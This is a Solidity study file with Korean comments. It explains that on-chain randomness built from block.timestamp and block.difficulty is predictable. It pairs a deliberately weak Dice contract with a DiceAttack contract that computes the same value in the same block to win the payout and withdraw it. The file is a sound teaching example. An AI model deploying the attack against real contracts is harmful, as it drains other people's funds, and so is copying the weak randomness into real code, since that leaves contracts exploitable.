// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0<0.9.0;
/* 
    블록체인에서 랜덤값을 생성하는 방법으로 사용되는 
    block.timestamp 와 block.difficulty는 보장되는 데이터가 아니다.
    온체인 상에서 아무리 랜덤 값을 생성하려고 하여도 
    결국 같은 블록상에서의 정보를 가지고 정답을 만들기때문에 공격에 취약하다 

    궁금했던 점 
    - 그러면 에초에 함수를 private로 선언하면 된느거 아닌가? 
        => 그러면 private와 internal은 payable 선언이 안된다 !! 
*/
contract Dice{
    constructor() payable {}
    receive() external payable { }

    address private winner;

    function roll(uint8 dice_number) public payable{
        uint8 dice = uint8(uint256(keccak256(abi.encodePacked(block.timestamp,block.difficulty)))%251);

        if(dice==dice_number){
            winner = msg.sender;
            (bool success,) = winner.call{value: 1 ether}("");// 승자한테 1 이더 송금 
            require(success,"Try again");
        }
    }

    function getWinner() public view returns(address) {
        return winner;
    }
}
// 인터페이스로 컨트랙트 함수 사용 
interface IDice {
    function roll(uint8) external ;
}
// 공격하는 contract 
contract DiceAttack {
    receive() external payable { }

    event showInfo(address,uint256);
    function attack(address _address) public payable {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(block.timestamp,block.difficulty)))%251);
        IDice(_address).roll(answer);// 해당 컨트랙트의 함수 똑같이 실행한다.
    }

    function withdraw(address payable _to) public payable{
        _to.transfer(address(this).balance);// 내가 원하는 계좌로 받은 이더를 송금 
        emit showInfo(address(this),address(this).balance );
    }
}